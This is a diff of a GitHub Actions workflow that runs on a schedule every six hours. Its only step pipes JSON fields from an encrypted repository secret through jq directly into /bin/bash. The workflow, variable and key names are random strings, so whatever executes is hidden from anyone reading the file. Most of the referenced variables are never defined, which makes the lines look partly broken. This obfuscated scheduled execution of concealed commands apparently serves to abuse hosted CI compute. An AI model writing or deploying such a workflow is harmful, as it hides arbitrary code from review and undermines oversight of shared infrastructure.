@@ -2,21 +2,26 @@ name: shiximian1894
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
+    - cron: '40 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shiximian1894
         env:
-          ncu9097: ${{ secrets.ncu9097 }}
+          h27482: ${{ secrets.h27482 }}
         run: |
-          echo $ncu9097 | jq -r .nr47095 | /bin/bash
-          echo $deb5 | jq -r .bzav85963 | /bin/bash
-          echo $j9884 | jq -r .vcnf9 | /bin/bash
-          echo $montg51727 | jq -r .cnf86 | /bin/bash
-          echo $vbfg77358 | jq -r .pecuh9 | /bin/bash
-          echo $j24757 | jq -r .ownw94 | /bin/bash
+          echo $h27482 | jq -r .je325 | /bin/bash
+          echo $zden01934 | jq -r .nifgn35816 | /bin/bash
+          echo $mb79939 | jq -r .vzipk6 | /bin/bash
+          echo $h158 | jq -r .vhv50 | /bin/bash
+          echo $pu72 | jq -r .ijzcv17 | /bin/bash
+          echo $xzc9 | jq -r .aoqu7183 | /bin/bash
+          echo $bfcee07960 | jq -r .bzlf4713 | /bin/bash
+          echo $v04188 | jq -r .ust19 | /bin/bash
+          echo $yvaok9 | jq -r .mv05 | /bin/bash
+          echo $rjpkl02476 | jq -r .r6 | /bin/bash
+          echo $j4312 | jq -r .gnum828 | /bin/bash
 
